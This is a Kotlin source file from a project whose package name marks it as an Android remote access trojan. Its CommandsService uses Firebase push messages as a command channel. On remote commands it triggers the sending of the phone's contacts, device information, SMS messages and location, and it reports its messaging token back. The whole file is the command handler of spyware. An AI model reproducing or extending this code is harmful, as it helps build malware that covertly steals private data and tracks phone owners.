package ru.awawa.rat.server

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import ru.awawa.rat.helper.Preferences

class CommandsService: FirebaseMessagingService() {

    private val tag = "CommandsService"

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)

        when (message.data["command"]) {
            "contacts" -> Interactor.sendContacts()
            "phone_info" -> Interactor.sendPhoneInfo()
            "sms" -> Interactor.sendSms()
            "location" -> Interactor.sendLocation()
        }

        Log.w(tag, "Received command: ${message.data["command"]}")
    }

    override fun onNewToken(newToken: String) {
        super.onNewToken(newToken)

        Preferences.set(Preferences.PreferencesField.TOKEN, newToken)
        Interactor.sendToken()
    }
}